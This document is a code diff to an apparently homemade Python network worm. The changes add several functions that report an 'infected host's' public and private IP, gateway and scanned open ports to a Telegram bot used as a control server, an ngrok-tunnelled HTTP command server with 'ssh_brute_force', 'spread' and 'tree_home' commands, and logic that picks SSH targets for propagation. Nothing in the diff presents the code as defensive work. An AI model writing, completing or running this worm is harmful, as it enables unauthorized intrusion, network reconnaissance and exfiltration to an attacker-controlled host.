@@ -8,6 +8,7 @@ import ipcalc
 import netaddr
 import sys
 import subprocess
+import logging
 from scapy.all import *
 from pyngrok import ngrok
 from http.server import BaseHTTPRequestHandler, HTTPServer
@@ -106,6 +107,7 @@ def discover_network(subnet):
 	pool = mp.Pool()
 	results = pool.map(send_arp,subnet)
 	results = [elem for elem in results if elem != 0]
+	
 	return results
 
 def calculate_subnet(host,netmask,gateway,broadcast):
@@ -119,9 +121,53 @@ def calculate_subnet(host,netmask,gateway,broadcast):
 """
 SEND FEEDBACK TO CONTROL SERVER
 """
-def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_ports):
+def send_feedback_no_22(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_ports):
+	public_ip = requests.get("https://api.ipify.org").text
+	status = "Infected host and its network informations:\n" + \
+		 "host public ip: " + public_ip + "\n" + \
+		 "host private ip: " + host_ip + "\n" + \
+		 "netmask: " + netmask + "\n" + \
+		 "broadcast: " + broadcast + "\n" + \
+		 "gateway: " + gateway + "\n\n"	
 
-	ret_status = 1 # meaning that there are devices on the subnet with well known ports open
+	status += "Network I'm in:\n"
+	for elem in devices_open_ports:
+		status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n" 
+
+	status += "No devices with port 22 opened, not possible to spread!\n"
+	post_req = requests.post("https://api.telegram.org/bot"+token+ \
+				  "/sendMessage",data={"chat_id":chat_id,"text":status})
+
+def send_feedback_no_net(token,chat_id,host_ip,netmask,broadcast,gateway):
+	public_ip = requests.get("https://api.ipify.org").text
+	
+	status = "Infected host and its network informations:\n" + \
+		 "host public ip: " + public_ip + "\n" + \
+		 "host private ip: " + host_ip + "\n" + \
+		 "netmask: " + netmask + "\n" + \
+		 "broadcast: " + broadcast + "\n" + \
+		 "gateway: " + gateway + "\n\n"	 
+
+	status += "Alone in the network!\n"
+	post_req = requests.post("https://api.telegram.org/bot"+token+ \
+				  "/sendMessage",data={"chat_id":chat_id,"text":status})
+
+def send_feedback_no_wkpo(token,chat_id,host_ip,netmask,broadcast,gateway):
+	public_ip = requests.get("https://api.ipify.org").text
+	
+	status = "Infected host and its network informations:\n" + \
+		 "host public ip: " + public_ip + "\n" + \
+		 "host private ip: " + host_ip + "\n" + \
+		 "netmask: " + netmask + "\n" + \
+		 "broadcast: " + broadcast + "\n" + \
+		 "gateway: " + gateway + "\n\n"	 
+
+	status += "All devices on the network have well known ports closed!\n"
+	post_req = requests.post("https://api.telegram.org/bot"+token+ \
+				  "/sendMessage",data={"chat_id":chat_id,"text":status})
+	
+
+def send_feedback_wkpo(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_ports):
 	
 	public_ip = requests.get("https://api.ipify.org").text
 	
@@ -132,18 +178,12 @@ def send_feedback(token,chat_id,host_ip,netmask,broadcast,gateway,devices_open_p
 		 "broadcast: " + broadcast + "\n" + \
 		 "gateway: " + gateway + "\n\n"	 
 
-	if not devices_open_ports:
-		status += "All devices have no well known ports open!\n"
-		ret_status = 0 # meaning that there aren't devices on the subnet with well known ports open
-	else:
-		status += "Network I'm in:\n"
-		for elem in devices_open_ports:
-			status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n"
+	status += "Network I'm in:\n"
+	for elem in devices_open_ports:
+		status += "ip: " + elem[0] + " open ports: " + str(elem[1]) + "\n"
 
 	post_req = requests.post("https://api.telegram.org/bot"+token+ \
 				  "/sendMessage",data={"chat_id":chat_id,"text":status})
-				  
-	return ret_status
 				  
 """
 DETERMINE WICH INTERFACE I'M USING
@@ -172,13 +212,25 @@ def delete():
 	# TODO: KILL python process and delete all worm files
 	return "deleted"
 	
+def tree_home():
+	process = subprocess.run(["tree","/home"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
+	return process.stdout
+	
 def execute_command(command):
 	if command == "ls":
 		return ls()
 	elif command == "delete":
 		return delete()
-
-class my_http_request_handler(BaseHTTPRequestHandler):
+		
+	elif command == "ssh_brute_force":
+		return "ssh_brute_force"
+	
+	elif command == "spread":
+		return "spread"
+	elif command == "tree_home":
+		return tree_home()
+	
+class request_handler(BaseHTTPRequestHandler):
 
 	def do_POST(self):
 		"""
@@ -188,7 +240,7 @@ class my_http_request_handler(BaseHTTPRequestHandler):
 		post_data = self.rfile.read(content_length)
 		
 		
-		allowed_commands = ["ls","delete"]
+		allowed_commands = ["ls","delete","tree_home","ssh_brute_force","spread"]
 		command = post_data.decode("utf-8")
 		
 		if command in allowed_commands:
@@ -197,7 +249,7 @@ class my_http_request_handler(BaseHTTPRequestHandler):
 			RESPONSE HEADERS
 			"""
 			self.send_response(200)
-			self.send_header("Content-type","text/html")
+			self.send_header("Content-type","text/html; charset=utf-8")
 			self.end_headers()
 			
 			"""
@@ -206,12 +258,44 @@ class my_http_request_handler(BaseHTTPRequestHandler):
 			self.wfile.write(output.encode("utf-8"))
 		else:
 			self.send_response(400)
-			self.send_header("Content-type","text/html")
+			self.send_header("Content-type","text/html; charset=utf-8")
 			self.end_headers()
-			self.wfile.write(b"COMMAND DOES NOT EXISTS")
+			self.wfile.write(b"command not allowed")
+
+class no_ssh_request_handler(BaseHTTPRequestHandler):
+
+	def do_POST(self):
+		"""
+		READ POST REQUEST
+		"""
+		content_length = int(self.headers["Content-Length"])
+		post_data = self.rfile.read(content_length)
+		
+		
+		allowed_commands = ["ls","delete","tree_home"]
+		command = post_data.decode("utf-8")
+		
+		if command in allowed_commands:
+			output = execute_command(command)
+			"""
+			RESPONSE HEADERS
+			"""
+			self.send_response(200)
+			self.send_header("Content-type","text/html; charset=utf-8")
+			self.end_headers()
+			
+			"""
+			RESPONSE DATA
+			"""
+			self.wfile.write(output.encode("utf-8"))
+		else:
+			self.send_response(400)
+			self.send_header("Content-type","text/html; charset=utf-8")
+			self.end_headers()
+			self.wfile.write(b"command not allowed")
 		
 
-def run_server(host,port,tel_token,chat_id):
+def run_server(host,port,tel_token,chat_id,ssh_enabled=False):
 	http_tunnel = ngrok.connect(port)	
 	print("opening http tunnel at: " + http_tunnel.public_url)
 	
@@ -224,7 +308,10 @@ def run_server(host,port,tel_token,chat_id):
 	"""
 	STARTING WEB SERVER
 	"""
-	webserver = HTTPServer((host,port),my_http_request_handler)
+	if ssh_enabled: 
+		webserver = HTTPServer((host,port),request_handler)
+	else:
+		webserver = HTTPServer((host,port),no_ssh_request_handler)
 	
 	try:
 		webserver.serve_forever()
@@ -234,14 +321,22 @@ def run_server(host,port,tel_token,chat_id):
 	webserver.server_close()
 
 if __name__ == "__main__":
+
+	logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 	
 	### CHECK IF ONLINE ###
-	print("checking if host is online...")
+	print("> checking if host is online...")
 	interface = determine_if()
 	if interface == 0 : sys.exit("Not online")
+	
+	### CONFIG ###
+	con_file = open("config.json","r")
+	config = json.load(con_file)
+	con_file.close()
 
 	### NETWORK DISCOVERY ###
-	print("discovering network...")
+	print("> discovering network...")
+	
 	info = netifaces.ifaddresses(interface)[netifaces.AF_INET]
 	host_ip = info[0]['addr']
 	netmask = info[0]['netmask']
@@ -251,37 +346,40 @@ if __name__ == "__main__":
 	subnet = calculate_subnet(host_ip,netmask,gateway,broadcast)
 	
 	network = discover_network(subnet)
+	if not network:
+		print("No other active devices in the network")
+		print("> sending feedback to control server...")
+		send_feedback_no_net(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway)
+		print("> starting http server. Waiting for commands...")
+		run_server("localhost",2525,config["http_token"],config["chat_id"])
+		sys.exit()
 	
 	### PORT SCAN OF EACH DEVICE ON THE NETWORK ###
-	print("scanning each device's ports on the network...")
+	print("> scanning each device's ports on the network...")
+	
 	devices_open_ports = port_scan(network)
+	if not devices_open_ports:
+		print("All devices on the network have well known ports closed")
+		print("> sending feedback to control server...")
+		send_feedback_no_wkpo(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway)
+		print("> starting http server. Waiting for commands...")
+		run_server("localhost",2525,config["http_token"],config["chat_id"])
+		sys.exit()
 	
-	### CONFIG ###
-	con_file = open("config.json","r")
-	config = json.load(con_file)
-	con_file.close()
-
-	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
-	print("sending feedback to control server...")
-	ret_status = send_feedback(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
-	
-	### TODO : MODIFY BEHAVIOR
-	if ret_status == 0 : sys.exit("no device with wkp open, nothing to do here")
-	
-	print("starting http server. Waiting for commands...")
-	run_server("localhost",2525,config["http_token"],config["chat_id"])
-	
-	"""
-	### SSH BRUTE FORCE ###
+	### CHECKING FOR DEVICES WITH PORT 22 OPENED ###
 	ssh_targets = [elem[0] for elem in devices_open_ports if 22 in elem[1]]
-	if not ssh_targets: sys.exit("no device with ssh active, not possibile to spread")
+	if not ssh_targets:
+		print("No devices with port 22 opened")
+		print("> sending feedback to control server...")
+		send_feedback_no_22(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
+		print("> starting http server. Waiting for commands...")
+		run_server("localhost",2525,config["http_token"],config["chat_id"])
+		sys.exit()
 	
-	for target_ip in ssh_targets:
-		credentials = [ssh_brute_force(target_ip,22)]
-		
-	print(credentials)
-	### AUTO PROPAGATION ###
-	for target in credentials:
-		if isinstance(target,list):
-			propagate(target[0],target[1],target[2],target[3])		
-	"""
+	### SENDING THE INFORMATION TO THE CONTROL SERVER ###
+	print("> sending feedback to control server...")
+	send_feedback_wkpo(config["http_token"],config["chat_id"],host_ip,netmask,broadcast,gateway,devices_open_ports)
+	
+	### RUNNING HTTP WEB SERVER ###
+	print("> starting http server. Waiting for commands...")
+	run_server("localhost",2525,config["http_token"],config["chat_id"],True)
